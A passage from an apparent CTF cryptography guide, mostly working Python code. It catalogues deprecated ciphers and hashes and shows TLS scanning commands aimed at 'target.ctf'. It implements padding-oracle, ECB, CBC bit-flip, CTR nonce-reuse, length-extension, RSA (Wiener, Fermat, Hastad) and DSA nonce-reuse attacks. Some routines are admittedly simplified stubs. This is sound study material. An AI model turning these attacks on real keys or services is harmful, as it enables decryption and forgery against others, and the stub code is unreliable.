openssl genrsa -out weak_rsa.pem 512
openssl genrsa -out weak_rsa.pem 1024

# Factor small RSA keys
# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
python3 RsaCtfTool.py --publickey weak_pub.pem --private
```

**DSA with SHA-1:**

bash

```bash
# DSA signatures using SHA-1 deprecated
# Nonce reuse attacks possible

# Generate DSA with SHA-1 (legacy)
openssl dsaparam -out dsaparam.pem 1024
openssl gendsa -out dsa_key.pem dsaparam.pem

# Sign with DSA (vulnerable if nonce reused)
openssl dgst -sha1 -sign dsa_key.pem -out signature.bin message.txt
```

#### NIST Cryptographic Algorithm Validation Program (CAVP)

**Algorithm Testing:**

bash

```bash
# CAVP validates cryptographic implementations
# Test vectors available for validation

# AES test vectors
wget https://csrc.nist.gov/CSRC/media/Projects/Cryptographic-Algorithm-Validation-Program/documents/aes/AESAVS.pdf

# SHA test vectors
wget https://csrc.nist.gov/CSRC/media/Projects/Cryptographic-Algorithm-Validation-Program/documents/shs/SHAVS.pdf
```

**Python NIST Test Vector Validation:**

python

```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import binascii

# AES-128 ECB test vector (NIST FIPS 197)
key = binascii.unhexlify('2b7e151628aed2a6abf7158809cf4f3c')
plaintext = binascii.unhexlify('6bc1bee22e409f96e93d7e117393172a')
expected = binascii.unhexlify('3ad77bb40d7a3660a89ecaf32466ef97')

cipher = AES.new(key, AES.MODE_ECB)
ciphertext = cipher.encrypt(plaintext)

assert ciphertext == expected, "AES test vector failed"
print("AES-128 ECB test vector: PASS")
```

### CTF-Specific Vulnerability Identification

**Challenge Reconnaissance:**

bash

```bash
# Identify cryptographic library versions
strings binary | grep -i "openssl"
strings binary | grep -i "libcrypto"

# Check linked libraries
ldd binary | grep crypto

# Identify weak ciphers in network services
nmap --script ssl-enum-ciphers -p 443 target.ctf

# Enumerate supported protocols
sslscan target.ctf:443
testssl.sh target.ctf:443
```

**Automated Vulnerability Scanning:**

bash

```bash
# Nmap NSE scripts for crypto vulnerabilities
nmap --script ssl-* -p 443 target.ctf

# Specific vulnerability checks
nmap --script ssl-heartbleed,ssl-poodle,ssl-dh-params target.ctf

# Cipher suite enumeration
nmap --script ssl-enum-ciphers target.ctf
```

**Manual Protocol Analysis:**

bash

```bash
# Capture TLS handshake
tcpdump -i eth0 -w capture.pcap port 443

# Analyze with Wireshark
wireshark capture.pcap
# Filter: ssl.handshake || tls.handshake

# Extract cipher suites from handshake
tshark -r capture.pcap -Y "ssl.handshake.type == 2" -T fields -e ssl.handshake.ciphersuite
```

### Important Subtopics

Consider exploring these related areas for comprehensive cryptographic vulnerability assessment:

- **Padding Oracle Attacks** - Practical exploitation of CBC padding validation
- **Timing Attacks** - Side-channel analysis of cryptographic operations
- **Weak Random Number Generation** - PRNG predictability and exploitation
- **Implementation Flaws** - Bugs in cryptographic library implementations (e.g., OpenSSL timing leaks, Debian weak keys)

---

## Weak Cipher Collections

### Deprecated Algorithms Registry

#### Symmetric Ciphers - Broken/Deprecated

**DES (Data Encryption Standard)**

```python
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad

# DES parameters
KEY_SIZE = 8  # 56 bits + 8 parity bits
BLOCK_SIZE = 8

# Basic DES implementation
def des_encrypt(plaintext, key):
    cipher = DES.new(key, DES.MODE_ECB)
    return cipher.encrypt(pad(plaintext, BLOCK_SIZE))

def des_decrypt(ciphertext, key):
    cipher = DES.new(key, DES.MODE_ECB)
    return unpad(cipher.decrypt(ciphertext), BLOCK_SIZE)

# Brute force attack on DES
def des_bruteforce(ciphertext, known_plaintext):
    """
    [Inference] Practical on modern hardware in hours/days
    DES keyspace: 2^56 keys
    """
    from itertools import product
    
    known_plaintext_padded = pad(known_plaintext, BLOCK_SIZE)
    
    # Example partial brute force (demo only - full search requires distributed computing)
    for key_int in range(0, 1000000):  # Truncated for demonstration
        key = key_int.to_bytes(8, 'big')
        try:
            cipher = DES.new(key, DES.MODE_ECB)
            test_ct = cipher.encrypt(known_plaintext_padded)
            if test_ct == ciphertext[:len(test_ct)]:
                return key
        except:
            continue
    return None

# Weak DES keys (8 known weak keys)
WEAK_DES_KEYS = [
    b'\x01\x01\x01\x01\x01\x01\x01\x01',
    b'\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE',
    b'\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1',
    b'\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E',
    b'\x01\xFE\x01\xFE\x01\xFE\x01\xFE',
    b'\xFE\x01\xFE\x01\xFE\x01\xFE\x01',
    b'\xE0\xF1\xE0\xF1\xF1\xE0\xF1\xE0',
    b'\x1F\x0E\x1F\x0E\x0E\x1F\x0E\x1F'
]

def check_weak_des_key(key):
    return key in WEAK_DES_KEYS
```

**3DES (Triple DES) - Deprecated**

```python
from Crypto.Cipher import DES3

# 3DES key sizes: 16 bytes (2-key) or 24 bytes (3-key)
def triple_des_operations(plaintext, key):
    """
    3DES deprecated due to 64-bit block size (Sweet32 attack)
    """
    # Ensure key is 16 or 24 bytes
    if len(key) not in [16, 24]:
        raise ValueError("3DES key must be 16 or 24 bytes")
    
    cipher = DES3.new(key, DES3.MODE_CBC)
    iv = cipher.iv
    ciphertext = cipher.encrypt(pad(plaintext, DES3.block_size))
    
    return ciphertext, iv

# Sweet32 birthday attack considerations
# [Inference] Practical after 2^32 blocks (~32GB) with same key
def detect_sweet32_vulnerability(block_count):
    SAFE_BLOCK_LIMIT = 2**32
    if block_count > SAFE_BLOCK_LIMIT:
        return True, "Sweet32 attack feasible"
    return False, "Below Sweet32 threshold"
```

**RC4 (Rivest Cipher 4)**

```python
# RC4 implementation (for CTF analysis)
class RC4:
    def __init__(self, key):
        self.key = key
        self.S = list(range(256))
        self._ksa()
    
    def _ksa(self):
        """Key Scheduling Algorithm"""
        j = 0
        for i in range(256):
            j = (j + self.S[i] + self.key[i % len(self.key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
    
    def _prga(self):
        """Pseudo-Random Generation Algorithm"""
        i = j = 0
        while True:
            i = (i + 1) % 256
            j = (j + self.S[i]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
            K = self.S[(self.S[i] + self.S[j]) % 256]
            yield K
    
    def encrypt(self, plaintext):
        keystream = self._prga()
        return bytes([p ^ next(keystream) for p in plaintext])
    
    decrypt = encrypt  # RC4 is symmetric

# Known RC4 weaknesses
def rc4_weak_key_attack(ciphertext):
    """
    First bytes of keystream have statistical bias
    """
    # Invariance weakness: certain key bytes reveal keystream bytes
    weak_positions = [0, 1, 2, 255]
    return weak_positions

# RC4 bias in initial keystream bytes
def rc4_initial_byte_bias():
    """
    [Inference] Statistical bias in first 256 bytes
    P(second_byte = 0) ≈ 1/128 instead of 1/256
    """
    return {
        'byte_position': 1,
        'expected_value': 0,
        'probability': 1/128,
        'normal_probability': 1/256
    }
```

**Blowfish (Weak for Small Block Size)**

```python
from Crypto.Cipher import Blowfish

# Blowfish: 64-bit blocks (vulnerable to birthday attacks)
def blowfish_operations(plaintext, key):
    """
    Deprecated due to 64-bit block size
    Vulnerable to Sweet32 like 3DES
    """
    cipher = Blowfish.new(key, Blowfish.MODE_CBC)
    iv = cipher.iv
    ciphertext = cipher.encrypt(pad(plaintext, Blowfish.block_size))
    return ciphertext, iv

# Blowfish weak keys (known key classes)
def check_blowfish_weak_keys(key):
    """
    [Unverified] Specific weak key classes reported but not comprehensively documented
    """
    # Check for all-zero or all-one patterns
    if key == b'\x00' * len(key) or key == b'\xff' * len(key):
        return True, "All-zeros or all-ones key"
    return False, "No obvious weakness"
```

**MD5 (Message Digest 5)**

```bash
# MD5 collision generation using HashClash
git clone https://github.com/cr-marcstevens/hashclash.git
cd hashclash
make

# Generate MD5 collision
./md5_fastcoll -p prefix.bin -o collision1.bin collision2.bin

# Verify collision
md5sum collision1.bin collision2.bin
```

```python
import hashlib

def md5_collision_demo():
    """
    Known MD5 collision pairs (discovered 2004)
    """
    # Famous collision pair (hex representation)
    block1 = bytes.fromhex(
        "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f89"
        "55ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5b"
        "d8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0"
        "e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70"
    )
    
    block2 = bytes.fromhex(
        "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f89"
        "55ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5b"
        "d8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0"
        "e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70"
    )
    
    hash1 = hashlib.md5(block1).hexdigest()
    hash2 = hashlib.md5(block2).hexdigest()
    
    print(f"Block 1 MD5: {hash1}")
    print(f"Block 2 MD5: {hash2}")
    print(f"Collision: {hash1 == hash2}")
    print(f"Identical: {block1 == block2}")

# MD5 length extension attack
def md5_length_extension(original_hash, original_length, append_data):
    """
    MD5 is vulnerable to length extension attacks
    """
    import struct
    
    # Calculate padding for original message
    ml = original_length * 8
    padding_length = (55 - original_length) % 64
    padding = b'\x80' + (b'\x00' * padding_length) + struct.pack('<Q', ml)
    
    # New message = original + padding + appended data
    # [Inference] Hash state can be continued from original hash
    return padding + append_data
```

**SHA-1 (Secure Hash Algorithm 1)**

```bash
# SHA-1 collision attack using sha1collisiondetection
git clone https://github.com/cr-marcstevens/sha1collisiondetection.git
cd sha1collisiondetection
make

# Check if file uses SHA-1 collision
./sha1dcsum file.bin
```

```python
import hashlib

def sha1_weakness_check():
    """
    SHA-1 broken in 2017 (SHAttered attack)
    First collision found by Google
    """
    # Known collision: shattered-1.pdf and shattered-2.pdf
    # Collision requires ~2^63.1 operations (practical with resources)
    
    return {
        'status': 'BROKEN',
        'collision_complexity': '2^63.1 operations',
        'year_broken': 2017,
        'attack_name': 'SHAttered'
    }

def sha1_vs_sha256_comparison(data):
    """
    Demonstrate migration from SHA-1 to SHA-256
    """
    sha1_hash = hashlib.sha1(data).hexdigest()
    sha256_hash = hashlib.sha256(data).hexdigest()
    
    return {
        'sha1': sha1_hash,
        'sha1_status': 'DEPRECATED',
        'sha256': sha256_hash,
        'sha256_status': 'SECURE'
    }
```

#### Asymmetric Ciphers - Weak Implementations

**RSA with Small Exponents**

```python
from Crypto.Util.number import long_to_bytes, GCD
import gmpy2

def small_e_attack(n, e, c):
    """
    When e=3 and message^3 < n, direct root extraction works
    """
    if e == 3:
        # Try direct cube root
        m = gmpy2.iroot(c, 3)
        if m[1]:  # Perfect cube
            return long_to_bytes(m[0])
    
    # Extended attack: message^e < k*n for small k
    for k in range(1, 1000):
        m = gmpy2.iroot(c + k * n, e)
        if m[1]:
            plaintext = long_to_bytes(m[0])
            # Verify
            if pow(int.from_bytes(plaintext, 'big'), e, n) == c:
                return plaintext
    
    return None

# Håstad's broadcast attack (same message, multiple recipients)
def hastad_broadcast_attack(ciphertexts, moduli, e=3):
    """
    When same message sent to e recipients with e=3
    Uses Chinese Remainder Theorem
    """
    from functools import reduce
    
    def chinese_remainder_theorem(remainders, moduli):
        total = 0
        prod = reduce(lambda a, b: a * b, moduli)
        for r, m in zip(remainders, moduli):
            p = prod // m
            total += r * pow(p, -1, m) * p
        return total % prod
    
    if len(ciphertexts) < e:
        return None
    
    # Apply CRT
    c_combined = chinese_remainder_theorem(ciphertexts[:e], moduli[:e])
    
    # Extract eth root
    m = gmpy2.iroot(c_combined, e)
    if m[1]:
        return long_to_bytes(m[0])
    
    return None
```

**Weak RSA Key Generation**

```python
import random
from Crypto.Util.number import getPrime, isPrime

def detect_weak_rsa_key(n, e, d=None):
    """
    Detect various RSA weaknesses
    """
    vulnerabilities = []
    
    # Check exponent size
    if e < 65537:
        vulnerabilities.append(('WEAK_EXPONENT', f'e={e} is too small'))
    
    # Check for small factors
    small_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
    for p in small_primes:
        if n % p == 0:
            vulnerabilities.append(('SMALL_FACTOR', f'n divisible by {p}'))
    
    # Check modulus size
    bit_length = n.bit_length()
    if bit_length < 2048:
        vulnerabilities.append(('SHORT_MODULUS', f'{bit_length} bits < 2048'))
    
    # Check for Wiener's attack conditions
    if d is not None and d < (n ** 0.25) / 3:
        vulnerabilities.append(('WIENER_VULNERABLE', 'd is too small'))
    
    # Check if n is even
    if n % 2 == 0:
        vulnerabilities.append(('EVEN_MODULUS', 'n is even'))
    
    return vulnerabilities

# Common modulus attack detection
def detect_common_modulus(key_pairs):
    """
    Check if multiple keys share the same modulus
    """
    moduli = {}
    for i, (n, e) in enumerate(key_pairs):
        if n in moduli:
            return True, f"Keys {moduli[n]} and {i} share modulus"
        moduli[n] = i
    return False, "No common moduli found"
```

**DSA with Weak Parameters**

```python
from Crypto.PublicKey import DSA
from Crypto.Random import random
import hashlib

def dsa_nonce_reuse_attack(msg1, sig1, msg2, sig2, q, g, y):
    """
    Extract private key when nonce k is reused
    r1, s1 = sig1
    r2, s2 = sig2
    
    If k is reused: r1 == r2
    Then: k = (H(m1) - H(m2)) / (s1 - s2) mod q
          x = (s*k - H(m)) / r mod q
    """
    r1, s1 = sig1
    r2, s2 = sig2
    
    if r1 != r2:
        return None, "No nonce reuse detected"
    
    # Calculate message hashes
    h1 = int(hashlib.sha1(msg1).hexdigest(), 16)
    h2 = int(hashlib.sha1(msg2).hexdigest(), 16)
    
    # Recover nonce k
    k = ((h1 - h2) * pow(s1 - s2, -1, q)) % q
    
    # Recover private key x
    x = ((s1 * k - h1) * pow(r1, -1, q)) % q
    
    return x, "Private key recovered"

def dsa_weak_parameters_check(p, q, g):
    """
    Check DSA parameters for known weaknesses
    """
    issues = []
    
    # Check q size (should be 160 or 256 bits minimum)
    q_bits = q.bit_length()
    if q_bits < 160:
        issues.append(f'q too small: {q_bits} bits')
    
    # Check p size (should be 1024, 2048, or 3072 bits)
    p_bits = p.bit_length()
    if p_bits < 2048:
        issues.append(f'p too small: {p_bits} bits')
    
    # Verify q divides p-1
    if (p - 1) % q != 0:
        issues.append('q does not divide p-1')
    
    # Verify g^q mod p == 1
    if pow(g, q, p) != 1:
        issues.append('g^q mod p != 1')
    
    return issues
```

#### Stream Ciphers - Deprecated

**Weak PRNG-Based Stream Ciphers**

```python
import random

def weak_lcg_stream_cipher(seed, length):
    """
    Linear Congruential Generator (predictable)
    x_{n+1} = (a * x_n + c) mod m
    """
    # Weak parameters (commonly used but predictable)
    a = 1103515245
    c = 12345
    m = 2**31
    
    x = seed
    keystream = []
    
    for _ in range(length):
        x = (a * x + c) % m
        keystream.append(x & 0xFF)
    
    return bytes(keystream)

def attack_lcg(outputs):
    """
    Recover LCG parameters from output sequence
    """
    if len(outputs) < 3:
        return None
    
    # Truncated LCG attack
    # If we have x_0, x_1, x_2:
    # x_1 = (a * x_0 + c) mod m
    # x_2 = (a * x_1 + c) mod m
    
    x0, x1, x2 = outputs[0], outputs[1], outputs[2]
    
    # Solve for a and c (simplified for demonstration)
    # [Inference] Full attack requires more sophisticated algebra
    m = 2**31  # Assumed modulus
    
    try:
        t1 = (x2 - x1) % m
        t2 = (x1 - x0) % m
        a = (t1 * pow(t2, -1, m)) % m
        c = (x1 - a * x0) % m
        return {'a': a, 'c': c, 'm': m}
    except:
        return None

# Mersenne Twister state recovery
def mt19937_untemper(y):
    """
    Reverse Mersenne Twister tempering operation
    """
    y = y ^ (y >> 18)
    y = y ^ ((y << 15) & 0xefc60000)
    
    # Reverse y ^= (y << 7) & 0x9d2c5680
    y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ ((y << 7) & 0x9d2c5680)
    
    # Reverse y ^= (y >> 11)
    y = y ^ (y >> 11)
    y = y ^ (y >> 11)
    
    return y & 0xffffffff
```

### Published Attacks by Cipher Type

#### Block Cipher Attacks

**ECB Mode - Block Reordering Attack**

```python
def ecb_cut_and_paste_attack(oracle_encrypt, oracle_decrypt):
    """
    Exploit ECB's deterministic encryption
    Create malicious ciphertext by rearranging blocks
    """
    # Example: Admin privilege escalation
    # Normal: email=user@test.com&role=user
    # Goal:   email=user@test.com&role=admin
    
    def craft_admin_payload():
        # Step 1: Create block containing "admin" + padding
        # Input: "email=AAAAAAAAAA" + "admin\x0b\x0b\x0b..." + "..."
        block_size = 16
        
        padding_len = block_size - len("email=")
        admin_block_input = "A" * padding_len + "admin" + "\x0b" * 11
        
        ct1 = oracle_encrypt(admin_block_input.encode())
        admin_block = ct1[block_size:block_size*2]
        
        # Step 2: Get normal user ciphertext
        # Input: "email=user@test.com&role="
        normal_input = "user@test.com"
        ct2 = oracle_encrypt(normal_input.encode())
        
        # Step 3: Combine blocks
        # Take first blocks of ct2, append admin_block
        malicious_ct = ct2[:block_size*2] + admin_block
        
        return malicious_ct
    
    return craft_admin_payload()

# ECB byte-at-a-time decryption
def ecb_decryption_oracle(oracle, block_size=16):
    """
    Decrypt unknown suffix appended by oracle
    """
    # Determine suffix length
    initial_len = len(oracle(b''))
    suffix_length = initial_len
    
    for i in range(1, block_size + 1):
        if len(oracle(b'A' * i)) > initial_len:
            suffix_length = initial_len - i
            break
    
    known_bytes = b''
    
    # Decrypt byte by byte
    for position in range(suffix_length):
        # Calculate padding needed
        padding_length = (block_size - 1 - (position % block_size))
        padding = b'A' * padding_length
        
        # Get target block
        target = oracle(padding)
        target_block_num = position // block_size
        target_block = target[target_block_num * block_size:(target_block_num + 1) * block_size]
        
        # Try all possible bytes
        for byte_val in range(256):
            test_input = padding + known_bytes + bytes([byte_val])
            test_output = oracle(test_input)
            test_block = test_output[target_block_num * block_size:(target_block_num + 1) * block_size]
            
            if test_block == target_block:
                known_bytes += bytes([byte_val])
                break
    
    return known_bytes
```

**CBC Mode - Padding Oracle Attack**

```python
def padding_oracle_decrypt_block(oracle, ciphertext, iv, block_size=16):
    """
    Decrypt single CBC block using padding oracle
    oracle(ct) returns True if padding valid
    """
    previous_block = iv
    current_block = ciphertext[:block_size]
    
    decrypted = bytearray(block_size)
    
    for pad_value in range(1, block_size + 1):
        # Attack from right to left
        for byte_guess in range(256):
            # Craft malicious IV
            test_iv = bytearray(block_size)
            
            # Set known bytes to produce correct padding
            for k in range(1, pad_value):
                test_iv[block_size - k] = decrypted[block_size - k] ^ pad_value
            
            # Set guess byte
            test_iv[block_size - pad_value] = byte_guess
            
            # Test with oracle
            if oracle(bytes(test_iv) + current_block):
                # Valid padding found
                decrypted[block_size - pad_value] = byte_guess ^ pad_value
                break
    
    # XOR with previous block to get plaintext
    plaintext = bytes([d ^ p for d, p in zip(decrypted, previous_block)])
    
    return plaintext

# CBC bit-flipping attack
def cbc_bit_flip_attack(ciphertext, iv, block_size=16):
    """
    Modify plaintext by flipping bits in previous ciphertext block
    """
    # Example: Change ";admin=false;" to ";admin=true;;"
    # Target is in block N, modify block N-1
    
    target_block = 2  # Block containing "admin=false"
    target_position = 6  # Position of 'f' in "false"
    
    # XOR relationship: P = D(C) XOR C_prev
    # To change P: C_prev' = C_prev XOR P_old XOR P_new
    
    modified_ct = bytearray(ciphertext)
    
    # Flip 'f' to 't': ord('f') ^ ord('t') = 0x66 ^ 0x74 = 0x12
    flip_mask = ord('f') ^ ord('t')
    
    prev_block_index = (target_block - 1) * block_size + target_position
    modified_ct[prev_block_index] ^= flip_mask
    
    # Also need to change 'alse' to 'rue;'
    # This demonstrates limitations - may corrupt other bytes
    
    return bytes(modified_ct)
```

**CTR Mode - Nonce Reuse Attack**

```python
from Crypto.Cipher import AES

def ctr_nonce_reuse_attack(ct1, ct2, known_plaintext1=None):
    """
    When nonce is reused in CTR mode:
    C1 = P1 XOR Keystream
    C2 = P2 XOR Keystream
    Therefore: C1 XOR C2 = P1 XOR P2
    """
    xored = bytes([b1 ^ b2 for b1, b2 in zip(ct1, ct2)])
    
    if known_plaintext1:
        # Recover P2 if P1 is known
        plaintext2 = bytes([x ^ p1 for x, p1 in zip(xored, known_plaintext1)])
        return plaintext2
    
    # Otherwise, return XORed plaintexts for analysis
    return xored

def ctr_keystream_recovery(ciphertexts, known_plaintexts):
    """
    Recover keystream from multiple CTR encryptions with same nonce
    """
    if len(ciphertexts) != len(known_plaintexts):
        return None
    
    # XOR ciphertext with known plaintext to get keystream
    keystream = bytes([c ^ p for c, p in zip(ciphertexts[0], known_plaintexts[0])])
    
    # Decrypt other ciphertexts
    recovered_plaintexts = []
    for ct in ciphertexts[1:]:
        pt = bytes([c ^ k for c, k in zip(ct, keystream)])
        recovered_plaintexts.append(pt)
    
    return keystream, recovered_plaintexts
```

#### Hash Function Attacks

**Length Extension Attack**

```python
import struct
import hashlib

def sha256_length_extension(original_hash, original_length, append_data, secret_length):
    """
    Extend SHA-256 hash without knowing secret
    Works on MD5, SHA-1, SHA-256, SHA-512 (Merkle-Damgård construction)
    Does NOT work on SHA-3 (sponge construction)
    """
    # Parse original hash as internal state
    h = [int(original_hash[i:i+8], 16) for i in range(0, len(original_hash), 8)]
    
    # Calculate padding for original message (secret + known)
    original_message_length = secret_length + original_length
    ml = original_message_length * 8
    
    # MD padding: message + 0x80 + zeros + length
    padding_length = (55 - original_message_length) % 64
    original_padding = b'\x80' + (b'\x00' * padding_length) + struct.pack('>Q', ml)
    
    # New message total length
    new_message_length = original_message_length + len(original_padding) + len(append_data)
    new_ml = new_message_length * 8
    
    # Continue hash from previous state
    # [Inference] This demonstrates the vulnerability principle
    # Actual implementation requires low-level SHA-256 operations
    
    return {
        'original_padding': original_padding,
        'new_data': original_padding + append_data,
        'new_length': new_message_length
    }

# Using hashpumpy library for practical attacks
def hashpump_attack(original_hash, original_data, append_data, key_length, algorithm='sha256'):
    """
    Practical length extension using hashpumpy
    """
    try:
        import hashpumpy
        
        new_hash, new_message = hashpumpy.hashpump(
            original_hash,
            original_data,
            append_data,
            key_length,
            algorithm=algorithm
        )
        
        return {
            'new_hash': new_hash,
            'new_message': new_message,
            'algorithm': algorithm
        }
    except ImportError:
        return "hashpumpy not installed: pip install hashpumpy"
```

**Collision Attacks**

```bash
# MD5 Collision Generation Tools

# HashClash - MD5 collision generation
git clone https://github.com/cr-marcstevens/hashclash
cd hashclash && make
./md5_fastcoll -p prefix.bin -o out1.bin out2.bin

# UniColl - Single-block MD5 collision
git clone https://github.com/corkami/collisions
cd collisions
python unicoll.py input.bin

# Verify collisions
md5sum out1.bin out2.bin

# SHA-1 Collision Detection
git clone https://github.com/cr-marcstevens/sha1collisiondetection
cd sha1collisiondetection && make
./sha1dcsum suspicious_file.pdf

# Create identical-prefix collision for PDFs
./build/md5_create_prefix attack --prefix common_prefix.pdf \
  --suffix1 variant1.pdf --suffix2 variant2.pdf
```

```python
# Collision-based certificate forgery detection
def detect_md5_collision_certificate(cert1_path, cert2_path):
    """
    Check if two certificates have MD5 collision
    """
    import hashlib
    
    with open(cert1_path, 'rb') as f1:
        cert1 = f1.read()
    with open(cert2_path, 'rb') as f2:
        cert2 = f2.read()
    
    md5_1 = hashlib.md5(cert1).hexdigest()
    md5_2 = hashlib.md5(cert2).hexdigest()
    sha256_1 = hashlib.sha256(cert1).hexdigest()
    sha256_2 = hashlib.sha256(cert2).hexdigest()
    
    result = {
        'md5_collision': md5_1 == md5_2 and cert1 != cert2,
        'sha256_collision': sha256_1 == sha256_2 and cert1 != cert2,
        'md5_1': md5_1,
        'md5_2': md5_2,
        'sha256_1': sha256_1,
        'sha256_2': sha256_2
    }
    
    return result

# Chosen-prefix collision demonstration
def chosen_prefix_collision_concept():
    """
    [Inference] Demonstrates collision types
    Actual generation requires specialized tools
    """
    return {
        'identical_prefix': 'Both messages start with same prefix',
        'chosen_prefix': 'Different prefixes, crafted collision blocks',
        'complexity_md5': '2^39 operations (practical)',
        'complexity_sha1': '2^63.1 operations (expensive but feasible)',
        'tools': ['HashClash', 'sha1collider']
    }
```

**Birthday Attack Implementation**

```python
import hashlib
import random

def birthday_attack_simulation(hash_func, output_bits, max_attempts=1000000):
    """
    Demonstrate birthday paradox in hash collisions
    Expected collisions: sqrt(2^n) = 2^(n/2)
    """
    seen_hashes = {}
    attempts = 0
    
    while attempts < max_attempts:
        # Generate random message
        message = random.randbytes(16)
        
        # Hash it (truncate to output_bits)
        hash_val = hash_func(message).digest()
        truncated = hash_val[:output_bits // 8]
        
        # Check for collision
        if truncated in seen_hashes:
            return {
                'collision_found': True,
                'attempts': attempts,
                'message1': seen_hashes[truncated],
                'message2': message,
                'hash': truncated.hex(),
                'expected_attempts': 2 ** (output_bits / 2)
            }
        
        seen_hashes[truncated] = message
        attempts += 1
    
    return {'collision_found': False, 'attempts': attempts}

# Truncated hash vulnerability
def analyze_truncated_hash(full_bits, truncated_bits):
    """
    Calculate collision probability for truncated hashes
    """
    import math
    
    full_security = 2 ** (full_bits / 2)
    truncated_security = 2 ** (truncated_bits / 2)
    
    return {
        'full_hash_bits': full_bits,
        'truncated_bits': truncated_bits,
        'full_collision_resistance': full_security,
        'truncated_collision_resistance': truncated_security,
        'security_reduction_factor': full_security / truncated_security,
        'warning': f'Truncation reduces security by {full_bits - truncated_bits} bits'
    }
```

#### RSA Attack Implementations

**Wiener's Attack (Small Private Exponent)**

```python
from fractions import Fraction
from Crypto.Util.number import long_to_bytes

def wieners_attack(n, e):
    """
    Attack RSA when d < n^0.25 / 3
    Uses continued fractions to find d
    """
    # Convert e/n to continued fraction
    convergents = continued_fractions(e, n)
    
    for k, d in convergents:
        if k == 0:
            continue
        
        # Check if this d works
        phi_n = (e * d - 1) // k
        
        # Solve x^2 - ((n - phi_n + 1))x + n = 0
        discriminant = (n - phi_n + 1) ** 2 - 4 * n
        
        if discriminant >= 0:
            sqrt_d = isqrt(discriminant)
            if sqrt_d * sqrt_d == discriminant:
                p = ((n - phi_n + 1) + sqrt_d) // 2
                q = ((n - phi_n + 1) - sqrt_d) // 2
                
                if p * q == n:
                    return {'p': p, 'q': q, 'd': d, 'method': 'Wiener'}
    
    return None

def continued_fractions(numerator, denominator):
    """
    Generate continued fraction convergents of numerator/denominator
    """
    convergents = []
    
    # Generate continued fraction coefficients
    cf = []
    while denominator:
        cf.append(numerator // denominator)
        numerator, denominator = denominator, numerator % denominator
    
    # Calculate convergents
    h0, h1 = 0, 1
    k0, k1 = 1, 0
    
    for a in cf:
        h = a * h1 + h0
        k = a * k1 + k0
        convergents.append((k, h))
        h0, h1 = h1, h
        k0, k1 = k1, k
    
    return convergents

def isqrt(n):
    """Integer square root"""
    if n < 0:
        raise ValueError("Square root of negative number")
    if n == 0:
        return 0
    
    x = n
    y = (x + 1) // 2
    while y < x:
        x = y
        y = (x + n // x) // 2
    return x
```

**Fermat's Factorization (Close Primes)**

```python
import gmpy2

def fermat_factorization(n, max_iterations=1000000):
    """
    Factor n when p and q are close: |p - q| is small
    Works when n = p*q and p ≈ q
    """
    a = gmpy2.isqrt(n) + 1
    b_squared = a * a - n
    
    for _ in range(max_iterations):
        if gmpy2.is_square(b_squared):
            b = gmpy2.isqrt(b_squared)
            p = a - b
            q = a + b
            
            if p * q == n:
                return {
                    'p': int(p),
                    'q': int(q),
                    'method': 'Fermat',
                    'iterations': _ + 1
                }
        
        a += 1
        b_squared = a * a - n
    
    return None

# Pollard's p-1 factorization
def pollards_p_minus_1(n, B=1000000):
    """
    Factor n when p-1 has only small prime factors
    """
    a = 2
    
    for j in range(2, B):
        a = pow(a, j, n)
        d = gmpy2.gcd(a - 1, n)
        
        if 1 < d < n:
            return {
                'factor': int(d),
                'method': 'Pollard p-1',
                'B': B,
                'j': j
            }
    
    return None

# Pollard's rho factorization
def pollards_rho(n, max_iterations=1000000):
    """
    General-purpose factorization for medium-sized n
    """
    x = 2
    y = 2
    d = 1
    
    def f(x):
        return (x * x + 1) % n
    
    iterations = 0
    while d == 1 and iterations < max_iterations:
        x = f(x)
        y = f(f(y))
        d = gmpy2.gcd(abs(x - y), n)
        iterations += 1
    
    if d != n:
        return {
            'factor': int(d),
            'method': 'Pollard rho',
            'iterations': iterations
        }
    
    return None
```

**Franklin-Reiter Related Message Attack**

```python
def franklin_reiter_attack(n, e, c1, c2, a=1, b=0):
    """
    Attack when two messages are linearly related:
    m2 = a*m1 + b (mod n)
    Both encrypted with same public key (n, e)
    """
    from sympy import symbols, Poly, gcd
    
    # Create polynomials
    x = symbols('x')
    
    # g1(x) = x^e - c1
    g1 = Poly(x**e - c1, x, domain='ZZ')
    
    # g2(x) = (ax + b)^e - c2
    g2 = Poly((a*x + b)**e - c2, x, domain='ZZ')
    
    # Compute GCD of polynomials modulo n
    # [Inference] This requires polynomial GCD over Z/nZ
    # Simplified implementation for demonstration
    
    def poly_gcd_mod(p1, p2, modulus):
        """GCD of polynomials modulo n"""
        while p2:
            p1, p2 = p2, p1 % p2
        return p1
    
    # The GCD should be (x - m1)
    # [Unverified] Full implementation requires advanced algebra libraries
    
    return {
        'method': 'Franklin-Reiter',
        'requirement': 'm2 = a*m1 + b',
        'note': 'Requires sympy or sage for polynomial GCD mod n'
    }

# Coppersmith's attack (polynomial roots mod n)
def coppersmith_short_pad_attack(n, e, c1, c2):
    """
    Attack when messages differ by small known padding
    m1 = m + r1, m2 = m + r2 where r1, r2 are small
    
    [Unverified] Requires sage mathematics for full implementation
    """
    return {
        'method': 'Coppersmith',
        'tool': 'SageMath',
        'command': 'small_roots() method on polynomial',
        'note': 'Best implemented in Sage, not pure Python'
    }
```

#### Elliptic Curve Attacks

**Invalid Curve Attack**

```python
def invalid_curve_attack_concept():
    """
